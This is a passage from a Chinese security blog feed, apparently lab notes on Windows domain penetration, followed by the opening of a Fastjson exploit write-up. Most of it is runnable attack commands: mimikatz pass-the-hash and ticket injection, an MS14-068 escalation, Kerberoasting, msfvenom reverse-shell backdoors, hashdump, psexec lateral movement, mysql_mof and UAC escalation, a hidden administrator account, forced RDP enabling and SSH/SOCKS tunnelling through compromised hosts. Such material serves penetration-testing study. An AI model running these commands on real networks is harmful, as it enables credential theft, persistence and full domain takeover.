src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p><p>Kerberos 协议在域中具体工作方法： </p><p>**1、客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用 krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检 测，成功之后创建 TGT(Ticket-Granting Ticket) **</p><p>**2、将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据 **</p><p>**3、 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服 务）票证，并且对 TGT 进行检测 **</p><p><strong>4、 检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</strong></p><pre><code>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试 PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试 PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试</code></pre><p><strong>PTH</strong></p><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p><p> 总结：KB2871997 补丁后的影响</p><p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接 </p><p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p><p>参考链接: <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>PTT</strong></p><p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的。</p><p>三种 常见的攻击方法：MS14-068，Golden ticket，SILVER ticket。</p><p>MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限，微软给出的补丁是 kb3011780。</p><p>Golden ticket(黄金票据)，SILVER ticket(白银票据)，属于权限维持技术 ，简单来说就是将连接合法的票据注入到 内存中实现连接。</p><p><strong>案例:</strong></p><p><strong>1.PTH传递-mimikatz</strong></p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。</p><pre><code>privilege::debugsekurlsa::logonPasswords</code></pre><p>假设我们找到了域控的hash密码</p><pre><code># PTH ntlm 传递# 未打补丁下的工作组及域连接：sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #连接域用户sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #连接本地用户sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\OWA2010CN-God.god.org</code></pre><p>就会弹出一个cmd窗口</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p><p><strong>2.PTK传递-mimikatz</strong></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p><p>这个必须打了补丁才能连接，不然连不上去</p><pre><code>PTK aes256 传递打补丁后的工作组及域连接：sekurlsa::ekeys #获取 aessekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><p><strong>3.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</strong></p><p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p><p>此处mimikatz无需提升权限，因为不涉及高权限操作，一个普通用户就可以</p><pre><code>#MS14-068 powershell 执行1.查看当前 sid whoami/user2.mimikatz # kerberos::purge//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list //查看当前机器凭证mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中3.利用 ms14-068 生成 TGT 数据ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#454.票据注入内存mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit5.查看凭证列表 klist6.利用dir \\192.168.3.21\c$  #如果ip无法识别，改成计算机名字</code></pre><p>第二种利用工具 kekeo</p><pre><code>1.生成票据kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;2.导入票据kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi3.查看凭证 klist4.利用 net use 载入dir \\192.168.3.21\c$</code></pre><p>第三种利用mimikatz导出本地票据(需要管理权限)</p><p>域控连接后10h内有效</p><pre><code>privilege::debugsekurlsa::tickets /exportkerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></pre><p><strong>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</strong></p><h2 id="RDP与SPN"><a href="#RDP与SPN" class="headerlink" title="RDP与SPN"></a><strong>RDP与SPN</strong></h2><p><strong>RDP</strong></p><p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p><pre><code>RDP明文密码链接1.windows: mstsc2.mstsc.exe /console /v:192.168.3.21 /admin3.linux: rdesktop 192.168.3.21:3389RDP密文HASH链接windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；开启命令：REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f开启后运行：1.mstsc.exe /restrictedadmin2.mimikatz.exe3.privilege::debug4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/4c75562739b29a50be3268d18090dd94.png" alt="img"></p><p><strong>域横向移动SPN服务-探针,请求,导出,破解,重写</strong></p><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p><p>1、探针</p><pre><code>setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot;</code></pre><p>2、请求票据</p><pre><code>klist purge //删除缓存票据klist    //查看票据# 请求票据 # powershell请求Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;# 或者mimikatz请求mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></pre><p>3、导出票据(到mimikatz运行目录)</p><pre><code># mimikatzmimikatz.exe &quot;kerberos::list /export&quot;</code></pre><p>4、破解票据</p><pre><code># 破解工具tgsrepcrack.py python3环境运行（将票据拖到本地破解）python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</code></pre><p>5、重写票据（属于后续攻击，不一定会成功，-u500指的是管理员用户，-g512指的是管理员组）</p><pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</code></pre><p>6、利用</p><pre><code>dir //xxx.xxx.xxx.xxx/c$</code></pre><h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p>通常，我们用于调试的计算机无法远程访问位于局域网中的待调试设备。通过 ssh 的端口转发(又称 ssh 隧道)技术，可以实现这种远程调试功能。ssh 客户端运行于本地机器，它的作用是：登录到目标机器并在目标机器上执行命令。它可以建立一个安全通道，为不安全网络上两个不受信任的主机提供安全的加密通信。X11 连接、任意 TCP 端口和 UNIX 域套接字也可以通过 ssh 安全通道进行转发。ssh 连接并登录到指定的主机名(用户名可选)。如果指定了命令，命令将在远程主机上执行，而不是在本机 shell 里执行。</p><p>ssh 端口转发相关的常用选项如下：</p><hr><p><strong>-C</strong></p><p>请求压缩所有数据(包括 stdin、stdout、stderr 和用于转发的 X11、TCP 和 UNIX 域连接的数据)。压缩算法与 gzip 使用的算法相同，压缩级别由 ssh 协议版本 1 的 CompressionLevel 选项控制。在调制解调器线路和其他慢速连接上采用压缩是可取的，但它会减慢快速网络上的速度。</p><hr><p><strong>-f</strong></p><p>请求 ssh 在执行命令之前转到后台。如果用户希望 ssh 在后台运行，但 ssh 需要用户提供密码或口令，使用 -f 选项就很有用，在用户输入密码之后，ssh 就会转入后台运行。这个选项隐含了 -n 选项的功能(-n 选项将 stdin 重定向到 /dev/null，从而避免后台进程读 stdin)。在远程站点上启动 X11 程序的推荐方法是使用 “ssh -f host xterm” 。</p><p>如果 ExitOnForwardFailure 配置选项设置的是 “yes”，则使用 -f 选项启动的 ssh 客户端会等所有的远程端口转发建立成功后才将自己转到后台运行。</p><hr><p><strong>-n</strong></p><p>将 stdin 重定向到 /dev/null (实际上是为了防止后台进程从stdin读取数据)。当 ssh 在后台运行时必须使用此选项。</p><p>一个常见的技巧是使用它在目标机器上运行 X11 程序。例如，<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> 将在 shadows.cs.hut.fi 上启动 emacs 程序。X11 的连接将通过加密通道自动转发。ssh 程序将在后台运行。(如果 ssh 需要请求密码或口令，则此操作无效；参见-f选项。)</p><hr><p><strong>-N</strong></p><p>不执行远程命令。此选项用于只需要端口转发功能时。</p><hr><p><strong>-g</strong></p><p>允许远程主机连接到本地转发端口。如果用于多路复用连接，则必须在主进程上指定此选项。</p><hr><p><strong>-t</strong></p><p>强制分配一个伪终端。在目标机上执行任意的基于屏幕的程序时(例如，实现菜单服务)，分配伪终端很有用。使用多个 -t 选项则会强制分配终端，即使 ssh 没有本地终端。</p><hr><p><strong>-T</strong></p><p>禁止分配伪终端。</p><hr><p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p><p>数据从本机转发到远程。本机上指定 TCP 端口或 UNIX 套接字的连接将被转发到目标机上指定端口或套接字。</p><p>上述参数中，bind_address 指本地地址；port 指本地端口；local_socket 指本地 UNIX 套接字；host 指远程主机地址；hostport 指远程端口；remote_socket 指远程 UNIX 套接字。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p><p><strong>ssh 端口转发模式</strong></p><p>ssh 的端口转发有三种模式：</p><ul><li><p><strong>本地：ssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p><p>将本地机监听端口 local_listen_port 上的数据转发到远程端口 remote_host:remote_port</p></li><li><p><strong>远程：ssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p><p>将代理机监听端口 agent_listen_port 上的数据转发到本地端口 local_host:local_port</p></li><li><p><strong>动态：ssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p></li></ul><p><strong>正向连接</strong></p><p>WEB服务器执行</p><pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144</code></pre><p><strong>反向连接</strong></p><p>在攻击机上启动ssh</p><pre><code>/etc/init.d/ssh start</code></pre><p>在web服务器上执行</p><pre><code>ssh -qTfnN -R port:host:hostport remote_ipssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # 将本地的22端口转发到192.168.0.115 的2222端口</code></pre><p>攻击机上再执行</p><pre><code>ssh -p 2222 web@127.0.0.1</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p><p><strong>Socket代理</strong></p><pre><code>SSH -qTfnN -D port remotehots</code></pre><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p><p>生成metaploit后门</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196set lport 12345exploit</code></pre><p>当运行后门，得到反弹shell后</p><p><strong>映射端口:</strong></p><pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128</code></pre><p>此时我们访问 本机的2020端口 即打开192.168.0.115:2020 实际上访问的是 10.10.10.128:80 的服务</p><p><strong>端口转发</strong></p><pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #将肉鸡的3389端口映射到本地的5555端口rdesktop 127.0.0.1:5555</code></pre><p><strong>查看列表</strong></p><pre><code>portfwd list</code></pre><p><strong>清空列表</strong></p><pre><code>portfwd flush</code></pre><h2 id="socket隧道"><a href="#socket隧道" class="headerlink" title="socket隧道"></a>socket隧道</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p><p>​    下载地址:</p><pre><code>http://sourceforge.net/project/ssocks/</code></pre><p>解压编译:</p><pre><code>tar zxvf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; make #编译后会创建一个src文件夹cd src</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p><p>kali机使用：</p><pre><code>./rcsocks -l 1088 -p 1080 -vv</code></pre><p>等待远程socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道</p><p>web服务器:</p><pre><code>/rssocks -vv -s 192.168.10.115:1080</code></pre><p>利用proxychains进行Socks5代理</p><p> 编辑proxychains工具</p><pre><code>vim /etc/proxychains.conf</code></pre><p>注释掉socks4，加上socks5</p><pre><code>#socks4 127.0.0.1 9050socks5 127.0.0.1 1088</code></pre><p>kail机使用代理访问：</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>就会成功访问</p><p>使用nmap扫描</p><pre><code>proxychains nmap -Pn -sT 10.10.10.128</code></pre><h1 id="跨路由扫描"><a href="#跨路由扫描" class="headerlink" title="跨路由扫描"></a>跨路由扫描</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到反弹shell</p><pre><code>getuid  查看当前用户ifconfig  获取网卡信息run get_local_subnets 获取路由信息run autoroute -p 查看当前路由run autoroute -s 10.10.10.0/24 增加路由 </code></pre><p>使用socks4a模块</p><pre><code>use auxiliary/server/socks4a</code></pre><p>　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。<br>   SRVPORT：监听的端口，默认为1080。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p><p>设置端口</p><pre><code>set SRVPORT 1044exploit</code></pre><p>然后配置proxychains</p><pre><code>vim /etc/proxychains.conf</code></pre><p>proxychains.conf </p><pre><code>socks4 192.168.0.115 1044</code></pre><p>使用nmap扫描</p><pre><code>proxychains nmap -sT Pn 10.10.10.128</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p><p>也可以用浏览器访问</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>缺点:</p><p>无法进行爆破(如hydra)等一些操作</p><h1 id="MSF-常见的内网测试渗透"><a href="#MSF-常见的内网测试渗透" class="headerlink" title="MSF-常见的内网测试渗透"></a>MSF-常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2003服务器反弹shell</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p><p>查看路由表</p><pre><code>route</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p><p>增加路由</p><pre><code>run autoroute -s 10.10.10.0/24</code></pre><p>查看路由列表</p><pre><code>run autoroute -p</code></pre><p>清空路由</p><pre><code>run autoroute -d</code></pre><p>提权命令:</p><pre><code>sysinfo 查看系统信息</code></pre><pre><code>ps 查看进程</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p><pre><code>getuid 当前用户getprivs 尽可能提升权限getsystem 通过各种攻击向量来提升系统用户权限</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p><p>增加管理员</p><pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add</code></pre><p>检测存活ip</p><pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p><p> 增加路由表</p><pre><code>run autoroute -s 10.10.10.0/24backgrounduse auxiliary/server/socks4aset SRVHOST 192.168.0.115 #端口默认是1080exploitvim /etc/proxychains.conf</code></pre><pre><code>socks4 192.168.0.115 1080</code></pre><pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt</code></pre><p>445开放，尝试hash攻击</p><p>hash获取</p><pre><code>meterpreter &gt; hashdump</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p><pre><code>ues exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost 10.10.10.131set SMBUser Administratorset SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxxexploit</code></pre><p>使用mimikatz来获取更多密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; run getgui -e #开启3389端口meterpreter &gt; run getgui -u sakura -p 123456 #增加用户</code></pre><pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #登录3389端口</code></pre><h1 id="MSF进行一次完整的域渗透流程"><a href="#MSF进行一次完整的域渗透流程" class="headerlink" title="MSF进行一次完整的域渗透流程"></a>MSF进行一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p><p>渗透前提:拿到了域客户机2008的shell</p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2008服务器反弹shell</p><p>扫描内网的机器</p><pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24</code></pre><p>加入路由</p><pre><code>backgroundroute add 10.10.1.3 255.255.255.0 1</code></pre><p>使用扫描器</p><pre><code>use scanner/portscan/tcp  #默认扫描1-10000端口set rhost 10.10.1.3exploit</code></pre><p>通过扫描发现 10.10.1.3 的3306端口存在mysql服务</p><p>进行弱口令攻击</p><pre><code>use auxiliary/scanner/mysql/mysql_loginset rhost 10.10.1.3set username rootset pass_file /root/password.txtexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p><p>成功爆破出弱口令</p><p>尝试使用mysql_mof提权,得到域客户机2003的session</p><pre><code>use exploit/windows/mysql/mysql_mofset password 123456set rhost 10.10.1.3set username rootset payload windows/metepreter/bind_tcpexploit</code></pre><p>现在拿到了2003的系统权限，就可以使用一些命令进行信息搜集</p><pre><code>new view /domain:moonsec #查看当前域用户</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p><p>得到目标机ip</p><pre><code>ping SERVERS2003</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p><pre><code>net user /domain  #获取所有域的用户列表net group /domain #获取域用户组信息net group &quot;domain admins&quot; /domain #获取当前域管理员信息net time /domain #查看域实际及域服务器名字</code></pre><p>可以得到域控信息</p><pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #这个就是域控</code></pre><p>因为普通域用户 需要更改系统信息 都需要通过域管理员的操作 要输入账号密码</p><p>抓明文 mimikatz</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p><p>尝试能否抓明文</p><pre><code>meterpreter &gt; kerberos #获取明文密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p><p>现在想要获取session</p><pre><code>use exploit/windows/smb/psexecset rhost 10.10.1.2set SMBDomain moonsecset SMBUser administratorset SMBPass xxx123456..set payload windows/meterpreter/bind_tcpexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p><p>得到域控shell，但是权限不够</p><pre><code>get privsgetsystem</code></pre><p>使用uac提权</p><pre><code>use exploit/windows/local/askset sessions 3exploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p><p>提权成功</p><p>获取hash密码</p><pre><code>meterpreter &gt; hashdump#或者meterpreter &gt;  run post/windows/gather/hashdump</code></pre><p>mimikatz抓明文密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; kerberos #获取明文密码meterpreter &gt; mimikatz_command -f samd::hashes #另一种方式获取hash值</code></pre><p>权限维持：进程注入</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p><pre><code>meterpreter &gt; migrate 2804</code></pre><p>开启域控远程连接</p><pre><code>meterpreter &gt; run getgui -e</code></pre><p>使用socks4a连接3389</p><pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0use auxiliary/server/socks4aset srvhost 10.10.1.2</code></pre><p>配置pxoxychains.conf</p><pre><code>vim /etc/proxychains.conf</code></pre><pre><code>....socks4 192.168.0.115 1080</code></pre><p>登录3389</p><pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #登录3389端口</code></pre><p>增加账号</p><pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;域的搭建&quot;&gt;&lt;a href=&quot;#域的搭建&quot; class=&quot;headerlink&quot; title=&quot;域的搭建&quot;&gt;&lt;/a&gt;域的搭建&lt;/h1&gt;&lt;p&gt;实验环境:&lt;/p&gt;
&lt;p&gt;win2008 域控       本地管理员密码:0801.com  域</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-16T09:39:56.000Z</published>
    <updated>2022-03-16T17:49:45.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。</p><h1 id="fastjson指纹识别"><a href="#fastjson指纹识别" class="headerlink" title="fastjson指纹识别"></a>fastjson指纹识别</h1><p>当我们在渗透测试中，抓包的时候发现返回的流量内容存在json格式时，我们就可以想它是不是使用了fastjson库</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>接着我们可以进一步进行判断</p><ol><li>根据报错信息判断</li></ol><p>发送一个post请求。发送的数据为没闭合的花括号，如果服务器没有屏蔽错误信息则会报出fastjson的信息。如果屏蔽了报错信息请看第二条</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>利用dnslog盲打</li></ol><p>对目标发送一个POST请求，请求体内容如下。请求头添加Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlog刷新成功</p><h1 id="Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)"></a>Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)</h1><p><strong>漏洞详情</strong></p><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p><strong>漏洞版本</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>漏洞分析</strong></p><p><a 